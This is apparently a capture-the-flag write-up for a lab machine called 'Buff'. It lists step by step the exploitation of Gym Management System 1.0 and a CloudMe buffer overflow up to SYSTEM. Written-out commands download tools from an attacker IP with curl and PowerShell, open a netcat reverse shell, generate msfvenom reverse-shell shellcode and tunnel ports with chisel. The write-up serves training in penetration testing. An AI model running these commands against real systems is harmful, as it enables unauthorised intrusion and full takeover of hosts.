# CTF Writeup: Buff

---

- Step 1: ran nmap scan --> 8080 is open --> web server
- Step 2: analyzed webpage on port 8080 and retrieved information about
gym management system 1.0
- Step 3: tried to find public cve's about this --> found unauthenticated rce 
- Step 4: downloaded cve locally and ran it. 
- Step 5: made python2 48506.py http://10.129.25.107:8080/ and gained webshell.
- Step 6: shell is very weak --> uploaded nc.exe into it to stabilize the shell.
- Step 7: made curl http://10.10.14.187:8000/nc.exe -o nc.exe, went into local machine
- Step 8: made nc -lvnp 1234 --> went into web-shell again & made nc 10.10.14.187 1234 -e cmd.exe
- Step 9: retrieved stabilized shell on listener. --> retrieved user.txt flag on shaun's Desktop
- Step 10: made netstat -ano to findout which port the binary cloudme is listening to
undet he localhostadresses I retrieved the port 8888
- Step 11: googled about cloudme cve's and found buffer over flow exploit, which allows
to give me arbitrary code execution.
- Step 12: made msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.187 LPORT=4444 -b '\x00\x0A\x0D\' -f python -v payload
to generate shell code
- Step 13: removed the shell code within the exploit and replaced it with the created one's from msfvenom.
- Step 14: downloaded windows x86 version of chisel and unpacked the .tar file --> gained chisel.exe
- Step 15: made chisel server -p 9999 --reverse
- Step 16: went into rce and made powershell -c iwr http://10.10.14.187:9000/chisel2.exe
- Step 17: made chisel2.exe client 10.10.14.187:9999 R:8888:localhost:8888
- Step 18: All of the traffic going in from the cloudme binary is being sent to my local port on 8888
- Step 19: Started listener on port 4444 --> because the shellcode I configured on the cloudme cve exploit was copied in there with port 4444
- Step 20: executed the cloudme cve, which should grant us unauthenticated remote code execution --> made sudo python ./48389.py 
- Step 21: gained rce as NT AUTHORITY/SYSTEM and retrieved root.txt flag.


---

## Key Learnings

- Immensly learned about Port Forwarding using Chisel.
- Improved Knowledge about tunneling local services.
- Further strengthened Knowledge about Netcat
- Added new tool to the arsenal --> Chisel.
